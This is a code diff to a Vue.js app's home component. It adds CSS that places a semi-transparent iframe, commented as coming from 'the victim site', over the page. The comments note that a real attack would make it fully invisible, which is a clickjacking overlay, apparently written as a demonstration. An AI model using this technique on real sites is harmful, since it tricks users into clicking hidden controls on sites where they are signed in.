@@ -1,7 +1,6 @@
 <template>
   <div class="home">
-    <img alt="Vue logo" src="../assets/logo.png">
-    <HelloWorld msg="Welcome to Your Vue.js App"/>
+    <HelloWorld msg="Welcome to Your Vue.js App" />
   </div>
 </template>
 
@@ -16,3 +15,15 @@ export default {
   },
 };
 </script>
+<style>
+iframe {
+  /* iframe from the victim site */
+  width: 400px;
+  height: 100px;
+  position: absolute;
+  top: 0;
+  left: -20px;
+  opacity: 0.5; /* in real opacity:0 */
+  z-index: 1;
+}
+</style>
